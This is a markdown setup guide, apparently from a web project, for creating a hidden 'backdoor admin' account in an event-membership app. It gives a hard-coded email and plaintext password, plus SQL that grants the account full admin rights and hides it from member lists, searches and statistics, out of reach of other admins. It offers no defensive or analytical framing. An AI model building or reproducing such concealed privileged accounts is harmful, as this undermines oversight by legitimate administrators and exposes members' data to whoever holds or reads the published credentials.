# Backdoor Admin Setup Guide

## Overview
Hidden backdoor admin account for emergency access. This account will NOT appear in member lists, search results, or statistics.

## Credentials
```
Email:    backdoor.admin@iweltyevent.com
Password: Adminiwt123!$
```

⚠️ **Store these credentials securely!**

---

## Quick Setup

### Step 1: Create User
1. Open your backend → Authentication → Users
2. Click "Add User"
3. Email: `backdoor.admin@iweltyevent.com`
4. Password: `Adminiwt123!$`
5. ✅ Enable "Auto Confirm User"
6. **Copy the generated User ID (UUID)**

### Step 2: Configure as Backdoor Admin
1. Go to SQL Editor in your backend
2. Replace `<USER_ID>` with the UUID from Step 1:

```sql
-- Mark as backdoor admin
UPDATE public.profiles
SET
  is_backdoor_admin = true,
  name = 'Backdoor Admin',
  account_verified = true,
  status = 'active'
WHERE id = '<USER_ID>';

-- Assign admin role
INSERT INTO public.user_roles (user_id, role)
VALUES ('<USER_ID>', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- Refresh view to hide user
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

### Step 3: Test
1. Login with backdoor admin credentials
2. ✅ Should have full admin access
3. Search for the email in Member Management
4. ✅ Should NOT appear in results (hidden)

---

## What's Included

### ✅ Backdoor Admin CAN:
- Login with credentials
- Access all admin features
- View/manage members
- Perform admin actions

### 🚫 Backdoor Admin CANNOT:
- Be seen in member lists
- Be found in searches
- Be included in statistics
- Be modified by other admins

---

## Troubleshooting

**Can't login?**
- Verify email is exactly: `backdoor.admin@iweltyevent.com`
- Check "Auto Confirm User" was enabled
- Check user exists in Authentication → Users

**Still appears in lists?**
- Run verification: `SELECT is_backdoor_admin FROM profiles WHERE email = 'backdoor.admin@iweltyevent.com';`
- Should return `true`
- If false, re-run Step 2 SQL

---

**Status**: ✅ Ready for setup
